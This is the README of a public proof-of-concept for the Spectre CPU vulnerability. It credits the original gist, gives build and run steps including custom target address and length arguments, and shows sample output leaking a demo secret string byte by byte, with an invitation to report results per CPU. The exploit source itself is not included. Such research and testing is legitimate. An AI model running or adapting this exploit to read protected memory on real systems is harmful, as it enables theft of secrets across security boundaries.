# SpectrePoC

Proof of concept code for the Spectre CPU exploit.

## Attribution

The original source code was taken from Erik August's gist, found here: https://gist.github.com/ErikAugust/724d4a969fb2c6ae1bbd7b2a9e3d4bb6

## Building

The project can be built with GNU Make and GCC.

On debian these are included in the `build-essential` metapackage.

Building is as easy as:

`cd SpectrePoC`

`make`

The output binary is `./spectre.out`.

If you want to build it manually, make sure to disable all optimisations (aka, don't use -O2), as it will break the program.

##Executing

To run specter with the example secret string "The Magic Words are Squeamish Ossifrage." as the target, simply run `./spectre.out` with no command line arguments.

If desired, a custom target address and length can be given as the first and second command line arguments, respectively.

## Example output

The following was output on an AMD GX-412TC SOC.

`./spectre.out:`

```
Reading 40 bytes:
Reading at malicious_x = 0xffffffffffdfed78... Success: 0x54=’T’ score=2
Reading at malicious_x = 0xffffffffffdfed79... Success: 0x68=’h’ score=2
Reading at malicious_x = 0xffffffffffdfed7a... Success: 0x65=’e’ score=2
Reading at malicious_x = 0xffffffffffdfed7b... Success: 0x20=’ ’ score=2
Reading at malicious_x = 0xffffffffffdfed7c... Success: 0x4D=’M’ score=2
Reading at malicious_x = 0xffffffffffdfed7d... Success: 0x61=’a’ score=2
Reading at malicious_x = 0xffffffffffdfed7e... Success: 0x67=’g’ score=2
Reading at malicious_x = 0xffffffffffdfed7f... Unclear: 0x69=’i’ score=997 (second best: 0x75 score=979)
Reading at malicious_x = 0xffffffffffdfed80... Unclear: 0x63=’c’ score=999 (second best: 0xC2 score=975)
Reading at malicious_x = 0xffffffffffdfed81... Unclear: 0x20=’ ’ score=998 (second best: 0x15 score=977)
Reading at malicious_x = 0xffffffffffdfed82... Unclear: 0x57=’W’ score=998 (second best: 0xB8 score=972)
Reading at malicious_x = 0xffffffffffdfed83... Unclear: 0x6F=’o’ score=994 (second best: 0xC3 score=974)
Reading at malicious_x = 0xffffffffffdfed84... Unclear: 0x72=’r’ score=997 (second best: 0xFC score=972)
Reading at malicious_x = 0xffffffffffdfed85... Unclear: 0x64=’d’ score=997 (second best: 0xB7 score=975)
Reading at malicious_x = 0xffffffffffdfed86... Unclear: 0x73=’s’ score=997 (second best: 0x75 score=977)
Reading at malicious_x = 0xffffffffffdfed87... Unclear: 0x20=’ ’ score=998 (second best: 0xB7 score=975)
Reading at malicious_x = 0xffffffffffdfed88... Unclear: 0x61=’a’ score=999 (second best: 0xCE score=976)
Reading at malicious_x = 0xffffffffffdfed89... Unclear: 0x72=’r’ score=996 (second best: 0xB7 score=976)
Reading at malicious_x = 0xffffffffffdfed8a... Unclear: 0x65=’e’ score=998 (second best: 0x1B score=978)
Reading at malicious_x = 0xffffffffffdfed8b... Unclear: 0x20=’ ’ score=996 (second best: 0xC2 score=965)
Reading at malicious_x = 0xffffffffffdfed8c... Unclear: 0x53=’S’ score=995 (second best: 0x7A score=967)
Reading at malicious_x = 0xffffffffffdfed8d... Unclear: 0x71=’q’ score=996 (second best: 0x6A score=968)
Reading at malicious_x = 0xffffffffffdfed8e... Unclear: 0x75=’u’ score=999 (second best: 0xB7 score=966)
Reading at malicious_x = 0xffffffffffdfed8f... Unclear: 0x65=’e’ score=997 (second best: 0xFA score=966)
Reading at malicious_x = 0xffffffffffdfed90... Unclear: 0x61=’a’ score=995 (second best: 0xA1 score=969)
Reading at malicious_x = 0xffffffffffdfed91... Unclear: 0x6D=’m’ score=995 (second best: 0x8B score=963)
Reading at malicious_x = 0xffffffffffdfed92... Unclear: 0x69=’i’ score=998 (second best: 0x1B score=966)
Reading at malicious_x = 0xffffffffffdfed93... Unclear: 0x73=’s’ score=996 (second best: 0x24 score=960)
Reading at malicious_x = 0xffffffffffdfed94... Unclear: 0x68=’h’ score=999 (second best: 0x27 score=964)
Reading at malicious_x = 0xffffffffffdfed95... Unclear: 0x20=’ ’ score=994 (second best: 0xCE score=965)
Reading at malicious_x = 0xffffffffffdfed96... Unclear: 0x4F=’O’ score=997 (second best: 0xEF score=963)
Reading at malicious_x = 0xffffffffffdfed97... Unclear: 0x73=’s’ score=993 (second best: 0x48 score=976)
Reading at malicious_x = 0xffffffffffdfed98... Unclear: 0x73=’s’ score=997 (second best: 0xB7 score=973)
Reading at malicious_x = 0xffffffffffdfed99... Unclear: 0x69=’i’ score=998 (second best: 0xC8 score=962)
Reading at malicious_x = 0xffffffffffdfed9a... Unclear: 0x66=’f’ score=994 (second best: 0xFA score=966)
Reading at malicious_x = 0xffffffffffdfed9b... Unclear: 0x72=’r’ score=995 (second best: 0x3D score=968)
Reading at malicious_x = 0xffffffffffdfed9c... Unclear: 0x61=’a’ score=994 (second best: 0x48 score=971)
Reading at malicious_x = 0xffffffffffdfed9d... Unclear: 0x67=’g’ score=997 (second best: 0xFA score=972)
Reading at malicious_x = 0xffffffffffdfed9e... Unclear: 0x65=’e’ score=994 (second best: 0x59 score=959)
Reading at malicious_x = 0xffffffffffdfed9f... Unclear: 0x2E=’.’ score=995 (second best: 0x8B score=966)
```

## Contributing

Feel free to add your results to the "Results" issue. Include your CPU Vendor Id, family, model name, stepping, microcode, Mhz, and cache size. These can be found by running cat /proc/cpuinfo.
